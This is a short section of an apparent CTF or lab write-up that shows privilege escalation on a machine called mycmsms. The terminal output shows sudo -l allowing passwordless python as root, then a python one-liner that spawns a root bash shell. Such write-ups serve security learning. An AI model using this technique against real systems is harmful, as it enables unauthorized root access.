# 6 privesc armour > root

```
armour@mycmsms:~$ sudo -l
Matching Defaults entries for armour on mycmsms:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User armour may run the following commands on mycmsms:
    (root) NOPASSWD: /usr/bin/python
armour@mycmsms:~$ which python
/usr/bin/python
</bin/python -c '__import__("os").system("/bin/bash");'
root@mycmsms:/home/armour# whoami;id
root
uid=0(root) gid=0(root) groups=0(root)
```
